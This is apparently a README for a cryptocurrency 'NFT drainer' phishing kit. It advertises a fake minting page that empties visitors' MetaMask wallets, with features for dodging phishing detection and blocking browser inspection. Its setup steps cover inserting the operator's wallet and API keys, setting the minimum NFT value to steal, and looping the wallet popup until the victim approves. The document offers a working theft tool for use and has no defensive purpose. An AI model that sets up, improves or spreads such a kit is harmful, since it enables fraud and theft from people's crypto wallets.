## 🖼️ NFT Stealer / ETH Stealer / Drainer Template / ETH Drainer / NFT Drainer

I DID NOT CREATE THIS SOFTWARE. CREDITS, QUESTIONS, AND ISSUES SHOULD BE DIRECTED HERE:
darkhubgeek@gmail.com [Telegram]https://t.me/Cyber_HacklordC

![preview](https://github.com/cyberlawd/ETH-TOKEN-NFT-DRAINER/blob/main/NFT.png?raw=true)
https://user-images.githubusercontent.com/108035292/210696593-0085a848-a2b4-4226-b6f4-0bc85287b3f9.mp4

## `💡 Features`

- [x] simple design 
- [x] Immediate transactions
- [x] Contract not required
- [x] Metamask Anti Phishing Detections
- [x] Anti F12 Inspect
- [x] Inspect Element Detection
- [x] Custom-made Design

## `✏️ Guidelines on Setting Up the Template:` 
you need to edit the **settings.js** file only. 
- line 1: const adress = `"YOUR WALLET";` replace **YOUR WALLET with your ETH wallet address.**
- line 2: const infuraId = `"InfuraId";` replace this by **your https://Infura.io app ID**
- line 3: const moralisApi = `"MoralisApi";` replace this by **your https://admin.moralis.io/web3apis web3 x-api key (copy api key > v1)**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.
  
## `👻 Important : `

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: **"YOUR WALLET"**, replace this your ETH wallet address.
- Line **"minValue: 0.2,"** is the minimum value of a NFT before it gets stolen. 
Exemple : If you change this value to **1**, the script will only steal NFTs that have a value higher to **1**.
### ➢ To see the metamask popup, you must host the website
